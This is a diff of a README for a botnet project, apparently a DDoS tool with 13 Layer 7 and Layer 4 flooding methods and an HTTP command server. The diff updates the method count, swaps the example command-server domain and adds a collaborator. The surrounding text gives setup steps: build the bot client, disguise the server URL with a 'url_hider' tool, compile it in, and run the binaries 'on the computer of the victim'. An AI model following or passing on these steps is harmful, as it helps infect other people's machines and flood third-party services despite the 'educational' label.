@@ -19,7 +19,7 @@
 
 This is a botnet made for educational purpose only. <br />
 Based on http server and c client with cross platform support. <br />
-Equiped with 11 methods - Layer 7 and Layer 4 (TCP & UDP). <br />
+Equiped with 13 methods - Layer 7 and Layer 4 (TCP & UDP). <br />
 Based on boostrap frontend. <br />
 Using Encom DOME for a nice and clean interface. <br />
 
@@ -76,7 +76,7 @@ Client :
 
 cd BOT && make
 
-cd url_hider && ./url_hider "your url without http ex : api.pandeo.fr"
+cd url_hider && ./url_hider "your url without http ex : api.example.com"
 
 Edit includes/px_botnet.h 
                           - stringifer with your url hided
@@ -103,7 +103,7 @@ Bot: Execute the binaries on the computer of the victim
 ## Collaborators :
  > - [PandeoF1 - Client & Backend](https://github.com/PandeoF1)
  > - [xxloubexx - Frontend & Backend](https://github.com/xxloubexx)
-
+ > - [TheVisual - Features & Fixes](https://github.com/TheVisual)
 ## (づ｡◕‿‿◕｡)づ :
 ```
  ██▓███        ▒██   ██▒
